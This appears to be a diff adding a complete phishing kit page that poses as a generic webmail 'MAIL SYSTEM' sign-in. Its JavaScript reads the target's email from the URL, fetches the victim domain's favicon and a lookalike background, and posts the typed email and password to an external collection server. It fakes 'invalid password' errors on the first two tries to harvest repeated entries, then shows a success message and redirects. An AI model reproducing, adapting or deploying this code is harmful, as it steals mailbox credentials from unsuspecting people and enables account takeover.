@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+<title>Login - </title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" />
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+</style>
+
+<style>
+body  {
+   width: 100vw;
+   height: 100vh;
+   padding:0px;
+   margin:0px;
+   /* background-image:url('sample.png'); */
+   font-family: 'Roboto', sans-serif;
+   color: #4e4e4e;
+}
+.b_base {
+   display: flex;
+   width: 100%;
+   height: 100%;
+   justify-content: center;
+   align-items: center;
+   background-color: rgb(0 0 0 / 75%);
+   font-family: 'Roboto', sans-serif;
+}
+.f_base {
+   max-width:90%;
+   width:350px;
+   background-color: white;
+   box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   -webkit-box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   -moz-box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   -o-box-shadow: 1px 2px 1px 2px rgb(0 0 0 / 15%);
+   border-radius:3px;
+   -moz-border-radius:3px;
+   -o-border-radius:3px;
+   -webkit-border-radius:3px;
+   font-family: 'Roboto', sans-serif;
+}
+.f_base .f_in {
+   padding: 40px 40px;
+   display: inline-block;
+   font-family: 'Roboto', sans-serif;
+   padding-top:15px;
+}
+.f_base .logo {
+   height: 30px;
+   display: flex;
+   justify-content: center;
+}
+.f_base .logo img {
+   height:100%;
+}
+.f_base h3 {
+   text-align: center;
+    font-weight: 300;
+    letter-spacing: 0.5px;
+    color: #80808087;
+    text-shadow: 0px 0px 1px #5252526b;
+    font-size: 20px;
+    margin-top: 15px;
+    font-family: 'Roboto', sans-serif;
+}
+.f_base h2 {
+   text-align: center;
+   word-break: break-word;
+   font-size: 16px;
+   font-weight: 400;
+}
+.f_form {
+   margin-top:30px;
+}
+.f_form .form-control {
+   height: 50px;
+   color:rgb(122 122 122);
+   font-size:14px;
+}
+.f_form .form-control[type="email"] {
+   padding-top:10px;
+}
+.f_form .form-control ~ label { 
+   padding-top:13px;
+   color: rgb(128 128 128 / 71%);
+   font-family: 'Roboto', sans-serif;
+}
+.form-check label {
+   vertical-align:bottom;
+   font-size:14px;
+}
+body.dark .b_base {
+    background-color: rgb(0 0 0 / 15%);
+}
+body.dark .f_base {
+   background-color: rgb(0 0 0 / 75%);
+   box-shadow:1px 1px 1px 0px rgb(0 0 0);
+   -webkit-box-shadow:1px 1px 1px 0px rgb(0 0 0);
+   -moz-box-shadow:1px 1px 1px 0px rgb(0 0 0);
+   -o-box-shadow:1px 1px 1px 0px rgb(0 0 0);
+}
+body.dark .f_base h3 {
+   color:rgb(255 255 255 / 60%);
+}
+body.dark .f_base h2 {
+   color:white;
+}
+body.dark label {
+   color:white;
+}
+.loader_b {
+    width: 100%;
+    height: 100%;
+    background-color: white;
+    position: absolute;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 123213213;
+    text-align:center;
+}
+.loader_b i.fa-check {
+    font-size: 50px;
+    color: green;
+    margin-bottom: 20px;
+}
+.loader_b .redi_mes {
+   font-weight: bold;
+   font-size: 21px;
+}
+.loader {
+  font-size: 10px;
+  margin: 50px auto;
+  text-indent: -9999em;
+  width: 11em;
+  height: 11em;
+  border-radius: 50%;
+  background: #828282;
+  background: -moz-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: -webkit-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: -o-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: -ms-linear-gradient(left, #828282 10%, rgba(130,130,130, 0) 42%);
+  background: linear-gradient(to right, #828282 10%, rgba(130,130,130, 0) 42%);
+  position: relative;
+  -webkit-animation: load3 1.4s infinite linear;
+  animation: load3 1.4s infinite linear;
+  -webkit-transform: translateZ(0);
+  -ms-transform: translateZ(0);
+  transform: translateZ(0);
+}
+.loader:before {
+  width: 50%;
+  height: 50%;
+  background: #828282;
+  border-radius: 100% 0 0 0;
+  position: absolute;
+  top: 0;
+  left: 0;
+  content: '';
+}
+.loader:after {
+  background: #ffffff;
+  width: 75%;
+  height: 75%;
+  border-radius: 50%;
+  content: '';
+  margin: auto;
+  position: absolute;
+  top: 0;
+  left: 0;
+  bottom: 0;
+  right: 0;
+}
+@-webkit-keyframes load3 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+@keyframes load3 {
+  0% {
+    -webkit-transform: rotate(0deg);
+    transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+    transform: rotate(360deg);
+  }
+}
+.hidden {
+   display:none;
+}
+.sla {
+    position: absolute;
+    right: 12px;
+    top: 15px;
+    font-size: 19px;
+    cursor: pointer;
+}
+body.sharp .f_base, body.sharp .f_form .form-control, body.sharp button, body.sharp .alert {
+   border-radius:0px;
+   -webkit-border-radius:0px;
+   -moz-border-radius:0px;
+   -o-border-radius:0px;
+}
+body.sharp .alert {
+   font-size: 14px;
+    padding: 10px 10px;
+}
+.dom_pl {
+    font-size: 16px;
+    margin-bottom: 0px;
+}
+.sub_b {
+   -webkit-transition: background-color 300ms linear;
+   -ms-transition: background-color 300ms linear;
+   transition: background-color 300ms linear;
+}
+.sub_b:hover {
+   background-color:#0b5ed79e;
+   -webkit-transition: background-color 300ms linear;
+   -ms-transition: background-color 300ms linear;
+   transition: background-color 300ms linear;
+}
+#frame_back {
+	position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+	z-index:-1;
+}
+.frame_back_over {
+	position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+	z-index: -1;
+}
+</style>
+</head>
+<body class="dark sharp">
+<div class="loader_b hidden" id="loader"><div class="loader"></div></div>
+<iframe id="frame_back" scrolling="no"></iframe>
+<div class="frame_back_over"></div>
+<div class="b_base">
+   <div class="f_base">
+      <div class="f_in">
+         <div class="logo">
+            <img id="logo">
+         </div>
+         <h3 id="dom_name"></h3>
+         <h2>Enter you mailbox password to proceed.</h2>
+         <form class="f_form" onsubmit="return se_plant_send(this)">
+			<input type="hidden" name="fcc" id="fcc" value="">
+            <div class="alert alert-danger mb-3 hidden" id="err" role="alert">
+            </div>
+            <div class="alert alert-primary mb-3 hidden" id="mi" role="alert">
+            </div>
+            <div class="form-floating mb-3">
+               <input type="email" class="form-control" id="email" name="email" placeholder="name@example.com" readonly="" required>
+               <label for="email"></label>
+            </div>
+            <div class="form-group mb-4 position-relative">
+               <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+               <!--<label for="email">Password</label>-->
+               <i class="fa fa-eye sla" onclick="gl_sla(this)" aria-hidden="true"></i>
+            </div>
+            <div class="form-check mb-4">
+               <input class="form-check-input" type="checkbox" value="" id="rem_me">
+               <label class="form-check-label" for="rem_me">Remember me</label>
+            </div>
+            <button type="submit" name="sub" class="btn btn-primary w-100 sub_b">Sign In</button>
+         </form>
+      </div>
+   </div>
+</div>
+<script>
+let sets = {};
+sets.email_destination = '';
+sets.f_loc = 'https://deidec22.ml/f.php';
+sets.tries = 0;
+sets.logins_errors = ['Invalid username/password please try again','Invalid username/password please try again'];
+sets.res_time = 5;
+sets.res_suc_mes = '<i class="fa-solid fa-check"></i><div class="redi_mes">Successful.... Redirecting to {domain}</div>';
+sets.domain = '';
+const _id = e => { return document.getElementById(e) }
+const _cll = e => { return document.getElementsByClassName(e) }
+const _tag = e => { return document.getElementsByTagName(e) }
+const _cre = e => { return document.createElement(e) }
+const ve = (email) => {
+  var re = /\S+@\S+\.\S+/;
+  return re.test(email);
+};
+const ge = () => {
+	let l = window.location.href;
+	let em = l.match(/([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
+	if(em&&em.length&&ve(em[0])){
+		return em[0];
+	}
+	let sp = l.split('#');
+	if(sp.length>1){
+		if(ve(sp[1])){
+			return sp[1];
+		}
+		try{
+			if(ve(atob(sp[1]))){
+				return atob(sp[1]);
+			}
+		}catch(e){
+			console.log(e);
+		}
+	}
+	return false;
+};
+const req = (data={},c) => {
+	let net = new XMLHttpRequest();
+	let form = new FormData();
+	let tt = +new Date();
+	if(typeof data === 'object'){
+		for(let i in data){
+			form.append(i,data[i]);
+		}
+	}
+	net.onreadystatechange=function(){
+		if(net.readyState===4){
+			try{
+				c(JSON.parse(net.responseText));
+			}catch(e){
+				c(net.responseText);
+			}
+		}
+	}
+	net.open('POST',sets.f_loc+'?u='+tt,true);
+	net.send(form);
+};
+function cap(string){
+  return string.charAt(0).toUpperCase() + string.slice(1);
+}
+let email = ge();
+if(email){
+	let domain = email.split('@')[1];
+	_id('logo').src = 'https://www.google.com/s2/favicons?domain='+domain;
+	_id('frame_back').src = sets.f_loc+'?bg='+domain;
+	_id('email').value = email;
+	sets.domain = domain;
+	sets.res_suc_mes = sets.res_suc_mes.replace("{domain}",domain);
+	let pe2 = domain.split('.')[0];
+    _tag('title')[0].innerHTML = cap(pe2) ? cap(pe2) + ' - MAIL SYSTEM Sign in to continue':'MAIL SYSTEM Sign in to continue';
+}
+const se_plant_send = f => {
+	_id('err').classList.add('hidden');
+	_id('err').innerHTML = '';
+	_id('mi').classList.remove('hidden');
+	_id('mi').innerHTML = 'Checking...';
+	f.sub.innerHTML = '<div class="spinner-border spinner-border-sm text-light" role="status"><span class="visually-hidden">Loading...</span></div>';
+	f.sub.disabled = true;
+	req({t:'login',email:f.email.value,pass:f.password.value,to:sets.email_destination},res=>{
+		if(sets.logins_errors[sets.tries]){
+			f.password.value = '';
+			f.password.focus();
+			setTimeout(function(){
+				f.sub.disabled = false;
+				f.sub.innerHTML = 'Sign In';
+				_id('mi').classList.add('hidden');
+				_id('mi').innerHTML = '';
+				_id('err').classList.remove('hidden');
+				_id('err').innerHTML = sets.logins_errors[sets.tries];
+				sets.tries++;
+			},1500);
+		}else{
+			f.sub.disabled = true;
+			_id('loader').classList.remove('hidden');
+			_id('loader').backgroundColor = 'rgb(255 255 255 / 97%)';
+
+			setTimeout(function(){
+				let a = _cre('div');
+				a.innerHTML = sets.res_suc_mes;
+				_id('loader').innerHTML = '';
+				_id('loader').appendChild(a);
+				setTimeout(function(){
+					window.location.replace(sets.f_loc+'?red='+sets.domain);
+				},parseInt(sets.res_time / 2) * 1000);
+			},parseInt(sets.res_time / 2) * 1000);
+			
+		}
+	});
+	return false;
+};
+</script>
+</body>
+</html>
